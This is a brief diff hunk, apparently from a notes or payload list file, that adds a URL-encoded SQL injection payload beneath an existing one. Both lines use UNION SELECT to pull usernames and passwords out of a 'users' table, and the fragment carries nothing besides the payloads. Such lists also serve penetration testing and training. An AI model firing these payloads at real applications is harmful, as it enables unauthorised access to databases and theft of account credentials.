@@ -99,6 +99,7 @@
 eg :-)
 
 ' union select username, password from users--+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
 
 
